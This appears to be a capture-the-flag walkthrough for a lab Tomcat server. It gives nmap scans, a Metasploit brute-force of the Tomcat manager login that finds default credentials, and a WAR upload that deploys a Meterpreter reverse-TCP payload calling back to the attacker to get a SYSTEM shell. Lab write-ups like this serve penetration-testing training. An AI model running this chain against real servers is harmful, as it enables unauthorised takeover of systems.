# Enumeration

Scan all TCP ports, then identify the services on the open ports.

```bash
nmap -p- --min-rate 1000 -T4 10.129.136.9
nmap -sC -sV -p 8080 10.129.136.9
```

Port 8080 hosts Apache Tomcat. Open `http://10.129.136.9:8080` and follow the **Manager App** link. The management interface requires authentication.

# Initial Access

Check common Tomcat credentials with Metasploit. Set port 8080 explicitly.

```text
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 10.129.136.9
set RPORT 8080
set STOP_ON_SUCCESS true
run
```

The valid credentials are `tomcat:s3cret`. Confirm them at `http://10.129.136.9:8080/manager/html`.

The account can deploy WAR applications. Use the upload module to deploy a Java reverse payload. Replace `<VPN_IP>` with the attacking machine's reachable HTB VPN address.

```text
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.129.136.9
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <VPN_IP>
set LPORT 4444
exploit
```

Metasploit starts the listener, deploys the application, and opens a Meterpreter session. Enter a Windows command shell and check the execution identity.

```text
shell
whoami
```

The shell runs as `NT AUTHORITY\SYSTEM`, so no separate privilege escalation is needed. Both flags are stored in the same file.

```cmd
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```


